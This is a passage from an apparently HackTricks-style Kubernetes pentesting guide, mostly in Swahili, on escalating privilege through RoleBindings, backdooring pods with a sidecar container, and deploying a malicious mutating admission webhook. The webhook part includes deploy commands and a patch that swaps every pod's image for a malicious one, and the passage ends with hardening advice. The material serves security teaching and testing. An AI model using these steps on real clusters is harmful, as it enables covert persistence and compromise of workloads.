Ruhusa ya kuunda Rolebindings inamruhusu mtumiaji **kuunganisha roles na akaunti ya huduma**. Ruhusa hii inaweza kupelekea kukuza privilege kwa sababu inaruhusu mtumiaji kuunganisha ruhusa za admin kwa akaunti ya huduma iliyovunjwa.

## Mashambulizi Mengine

### Programu ya proxy ya Sidecar

Kwa kawaida hakuna usimbuaji katika mawasiliano kati ya pods. Uthibitishaji wa pamoja, wa pande mbili, kutoka pod hadi pod.

#### Unda programu ya proxy ya sidecar

Kontena ya sidecar inajumuisha kuongeza **kontena ya pili (au zaidi) ndani ya pod**.

Kwa mfano, ifuatayo ni sehemu ya usanidi wa pod yenye kontena 2:
```yaml
spec:
containers:
- name: main-application
image: nginx
- name: sidecar-container
image: busybox
command: ["sh","-c","<execute something in the same pod but different container>"]
```
Kwa mfano, ili kuingiza backdoor kwenye pod iliyopo kwa kutumia kontena jipya unaweza kuongeza kontena jipya katika maelezo. Kumbuka kwamba unaweza **kutoa ruhusa zaidi** kwa kontena la pili ambazo la kwanza halitakuwa nazo.

Taarifa zaidi kwenye: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Mdhibiti wa Kuingia Mbaya

Mdhibiti wa kuingia **unakamata maombi kwa seva ya API ya Kubernetes** kabla ya kudumu kwa kitu, lakini **baada ya ombi kuthibitishwa** **na kuidhinishwa**.

Ikiwa mshambuliaji kwa namna fulani anafanikiwa **kuingiza Mdhibiti wa Kuingia wa Mabadiliko**, ataweza **kubadilisha maombi ambayo tayari yameidhinishwa**. Kuwa na uwezo wa kuweza kujiinua, na kwa kawaida kudumu katika klasta.

**Mfano kutoka** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Angalia hali ili kuona kama iko tayari:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format&format=webp)

Kisha peleka pod mpya:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Wakati unaweza kuona kosa la `ErrImagePull`, angalia jina la picha kwa moja ya maswali yafuatayo:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format&format=webp)

Kama unavyoona katika picha hapo juu, tulijaribu kuendesha picha `nginx` lakini picha iliyotekelezwa mwishowe ni `rewanthtammana/malicious-image`. Nini kimetokea!!?

#### Technicalities

Script ya `./deploy.sh` inaanzisha mutating webhook admission controller, ambayo inabadilisha maombi kwa API ya Kubernetes kama ilivyoainishwa katika mistari yake ya usanidi, ikihusisha matokeo yaliyoshuhudiwa:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
The above snippet replaces the first container image in every pod with `rewanthtammana/malicious-image`.

## OPA Gatekeeper bypass

{{#ref}}
../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md
{{#endref}}

## Best Practices

### **Kuzima Automount ya Tokens za Akaunti ya Huduma**

- **Pods na Akaunti za Huduma**: Kwa kawaida, pods huweka token ya akaunti ya huduma. Ili kuboresha usalama, Kubernetes inaruhusu kuzima kipengele hiki cha automount.
- **Jinsi ya Kutumia**: Weka `automountServiceAccountToken: false` katika usanidi wa akaunti za huduma au pods kuanzia toleo la Kubernetes 1.6.

### **Kuteua Watumiaji kwa Uangalifu katika RoleBindings/ClusterRoleBindings**

- **Injini ya Uchaguzi**: Hakikisha kuwa watumiaji wanaohitajika tu wanajumuishwa katika RoleBindings au ClusterRoleBindings. Kagua mara kwa mara na kuondoa watumiaji wasiohusika ili kudumisha usalama mkali.

### **Majukumu Maalum ya Namespace Juu ya Majukumu ya Cluster-Wide**

- **Majukumu vs. ClusterRoles**: Prefer kutumia Majukumu na RoleBindings kwa ruhusa maalum za namespace badala ya ClusterRoles na ClusterRoleBindings, ambazo zinatumika kwa kiwango cha cluster. Njia hii inatoa udhibiti wa kina na inapunguza wigo wa ruhusa.

### **Tumia zana za kiotomatiki**

{{#ref}}
https://github.com/cyberark/KubiScan
{{#endref}}

{{#ref}}
https://github.com/aquasecurity/kube-hunter
{{#endref}}

{{#ref}}
https://github.com/aquasecurity/kube-bench
{{#endref}}

## **Marejeleo**

- [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
- [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
- [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)
- [**https://kubenomicon.com/Lateral_movement/CoreDNS_poisoning.html**](https://kubenomicon.com/Lateral_movement/CoreDNS_poisoning.html)
- [**https://kubenomicon.com/**](https://kubenomicon.com/)

{{#include ../../../banners/hacktricks-training.md}}
